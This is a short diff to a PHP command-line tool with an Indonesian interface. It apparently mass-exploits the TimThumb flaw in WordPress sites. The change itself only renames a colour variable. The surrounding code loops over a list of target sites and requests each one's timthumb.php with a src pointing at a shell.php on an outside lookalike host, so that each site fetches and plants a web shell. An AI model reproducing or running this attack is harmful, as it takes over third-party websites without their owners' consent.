@@ -9,7 +9,7 @@ system("clear");
 $hij = "\033[0;32m";
 $mer = "\033[0;31m";
 $put = "\033[1;37m";
-$gtw = "\033[2;33m";
+$cok = "\033[2;33m";
 echo $put."
  _______ _____ __  __ _______ _    _ _    _ __  __ ____  
 |__   __|_   _|  \/  |__   __| |  | | |  | |  \/  |  _ \ 
@@ -27,9 +27,9 @@ if (!$argv[1]) {
 	$ledak = explode("\n", $ngambil);
 	$try = count($ledak);
 	sleep(2);
-	echo $gtw."Jumlah list [ ".$try." ] sites \n";
+	echo $cok."Jumlah list [ ".$try." ] sites \n";
 	sleep(1);
-	echo $gtw."Wait... \n\n";
+	echo $cok."Wait... \n\n";
 	foreach($ledak as $duar) {
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, $duar."/timthumb.php?src=http://flickr.com.tvcw.org/shell.php");
